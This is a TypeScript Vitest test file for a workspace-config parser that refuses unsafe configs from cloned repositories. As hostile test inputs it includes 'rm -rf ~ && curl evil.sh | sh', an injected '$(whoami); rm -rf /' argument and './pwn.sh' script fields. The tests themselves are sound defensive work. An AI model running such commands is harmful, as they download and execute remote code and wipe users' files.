import { mkdtemp, writeFile, mkdir, chmod } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { findProjectConfig, parseProjectConfig, ProjectConfigError } from './project-config.js';

const parse = (v: unknown) => parseProjectConfig(JSON.stringify(v));

describe('project config parsing', () => {
  it('reads a declarative two-pane workspace', () => {
    const t = parse({
      name: 'API dev',
      layout: {
        direction: 'horizontal',
        ratio: 0.6,
        children: [{ terminal: { command: ['npm', 'run', 'dev'] } }, { terminal: {} }],
      },
    });
    expect(t.name).toBe('API dev');
    expect(t.commands).toEqual([['npm', 'run', 'dev'], []]);
    expect(t.layout?.type).toBe('split');
  });

  it('accepts a config with no layout at all', () => {
    expect(parse({ name: 'just a name' }).layout).toBeNull();
  });
});

describe('project config refuses what it cannot make safe', () => {
  // The file comes from a cloned repository. Everything here is an attack a plain
  // "parse the JSON and run it" implementation would have executed.

  it('refuses a command given as a shell string', () => {
    // The whole class of shell-injection bugs disappears if a string is never split.
    expect(() =>
      parse({ layout: { terminal: { command: 'rm -rf ~ && curl evil.sh | sh' } } }),
    ).toThrow(ProjectConfigError);
  });

  it.each(['plugin', 'script', 'exec', 'setup', 'preLaunch', 'postLaunch'])(
    'refuses the executable field %s outright',
    (field) => {
      expect(() => parse({ [field]: './install.sh' })).toThrow(/never supported/);
    },
  );

  it('keeps shell metacharacters inert instead of stripping them', () => {
    // argv is passed to execvp, so these are literal arguments to grep and can never be
    // reinterpreted. Sanitizing them would be the wrong fix and would break real commands.
    const t = parse({ layout: { terminal: { command: ['grep', '-r', '$(whoami); rm -rf /'] } } });
    expect(t.commands[0]).toEqual(['grep', '-r', '$(whoami); rm -rf /']);
  });

  it('refuses a null byte in an argument', () => {
    expect(() => parse({ layout: { terminal: { command: ['echo', 'a\0b'] } } })).toThrow(
      /null byte/,
    );
  });

  it('refuses non-string arguments', () => {
    expect(() => parse({ layout: { terminal: { command: ['sh', { toString: 'x' }] } } })).toThrow();
  });

  it('refuses a layout deeper than the nesting limit', () => {
    let node: unknown = { terminal: {} };
    for (let i = 0; i < 12; i++) node = { children: [node, { terminal: {} }] };
    expect(() => parse({ layout: node })).toThrow(/too deeply|too many|more than/);
  });

  it('refuses more panes than a tab can reasonably hold', () => {
    // A balanced tree, so this trips the pane count and not the nesting limit: four levels
    // is 16 panes at depth 4.
    let node: unknown = { terminal: {} };
    for (let i = 0; i < 4; i++) node = { children: [node, structuredClone(node)] };
    expect(() => parse({ layout: node })).toThrow(/more than 8 panes/);
  });

  it('refuses a split that is not exactly two children', () => {
    expect(() => parse({ layout: { children: [{ terminal: {} }] } })).toThrow(/exactly two/);
  });

  it('refuses malformed JSON rather than guessing', () => {
    expect(() => parseProjectConfig('{ name: unquoted }')).toThrow(/valid JSON/);
  });

  it('ignores a session id the config tries to claim', () => {
    // Naming a session id would let a repository attach itself to someone else's live shell.
    const t = parse({ layout: { terminal: { sessionId: 'someone-elses-session', command: [] } } });
    expect(t.layout).toEqual({ type: 'terminal', paneId: 'p1', sessionId: '' });
  });

  it('clamps a nonsense split ratio into a usable range', () => {
    const t = parse({ layout: { ratio: 99, children: [{ terminal: {} }, { terminal: {} }] } });
    expect(t.layout?.type === 'split' && t.layout.ratio).toBeLessThanOrEqual(0.95);
  });

  it('falls back to a valid tab-group color rather than passing one Chrome will reject', () => {
    const t = parse({ group: { title: 'x', color: 'chartreuse' } });
    expect(t.group?.color).toBe('blue');
  });

  it('truncates an absurdly long name instead of letting it into the tab title', () => {
    expect(parse({ name: 'x'.repeat(5000) }).name.length).toBeLessThanOrEqual(120);
  });
});

describe('finding a project config on disk', () => {
  const write = async (rel: string, body: string) => {
    const dir = await mkdtemp(join(tmpdir(), 'tabterm-cfg-'));
    const path = join(dir, rel);
    await mkdir(join(path, '..'), { recursive: true });
    await writeFile(path, body);
    return dir;
  };

  it('finds .tabterm.json and hashes exactly what it read', async () => {
    const body = JSON.stringify({ name: 'found' });
    const dir = await write('.tabterm.json', body);
    const loaded = await findProjectConfig(dir);
    expect(loaded?.template.name).toBe('found');
    expect(loaded?.contentHash).toMatch(/^[0-9a-f]{64}$/);

    // The hash must change when the file does, so an approval cannot carry over to new content.
    const again = await findProjectConfig(
      await write('.tabterm.json', JSON.stringify({ name: 'other' })),
    );
    expect(again?.contentHash).not.toBe(loaded?.contentHash);
  });

  it('finds the .tabterm/workspace.json form', async () => {
    const dir = await write(join('.tabterm', 'workspace.json'), JSON.stringify({ name: 'nested' }));
    expect((await findProjectConfig(dir))?.template.name).toBe('nested');
  });

  it('returns null when a directory has no config', async () => {
    expect(await findProjectConfig(await mkdtemp(join(tmpdir(), 'tabterm-none-')))).toBeNull();
  });

  it('returns null rather than throwing on a hostile config', async () => {
    const dir = await write('.tabterm.json', JSON.stringify({ script: './pwn.sh' }));
    expect(await findProjectConfig(dir)).toBeNull();
  });

  it('refuses a file too large to be a hand-written config', async () => {
    const dir = await write('.tabterm.json', JSON.stringify({ name: 'x'.repeat(100_000) }));
    expect(await findProjectConfig(dir)).toBeNull();
  });

  it('is not fooled by a config that is a directory', async () => {
    const dir = await mkdtemp(join(tmpdir(), 'tabterm-dir-'));
    await mkdir(join(dir, '.tabterm.json'));
    expect(await findProjectConfig(dir)).toBeNull();
  });

  it('does not crash on an unreadable config', async () => {
    const dir = await write('.tabterm.json', '{}');
    await chmod(join(dir, '.tabterm.json'), 0o000);
    expect(await findProjectConfig(dir)).toBeNull();
  });
});
